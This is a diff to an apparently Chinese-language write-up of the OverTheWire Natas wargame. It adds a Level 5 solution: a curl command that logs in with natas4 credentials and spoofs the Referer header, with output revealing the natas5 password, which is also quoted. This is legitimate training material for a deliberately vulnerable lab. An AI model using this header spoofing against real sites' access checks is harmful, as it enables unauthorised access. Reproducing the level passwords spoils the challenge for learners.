@@ -84,3 +84,15 @@ Disallow: /s3cr3t/
 natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
 ```
 密码为 `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`
+
+## Level 5
+```sh
+❯ curl http://natas4.natas.labs.overthewire.org -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth \
+-H "Referer: http://natas5.natas.labs.overthewire.org/"
+...
+Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
+...
+```
+密码为 `e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M`
+
+## Level 6
